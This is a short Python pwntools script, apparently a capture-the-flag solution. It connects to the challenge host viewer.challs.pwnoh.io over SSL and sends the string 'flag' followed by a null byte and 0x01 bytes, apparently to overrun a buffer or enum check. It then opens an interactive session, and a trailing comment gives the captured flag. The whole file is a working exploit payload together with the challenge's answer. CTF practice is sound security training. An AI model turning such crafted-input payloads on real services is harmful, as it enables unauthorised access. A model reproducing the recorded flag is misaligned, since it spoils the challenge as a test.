#!/usr/bin/env python3
from pwn import *

p = remote('viewer.challs.pwnoh.io', 1337, ssl=True)

p.sendline(b"flag" + b'\x00\x01\x01\x01\x01\x01\x01')
p.interactive()
#bctf{I_C4nt_Enum3rAte_7hE_vuLn3r4biliTI3s}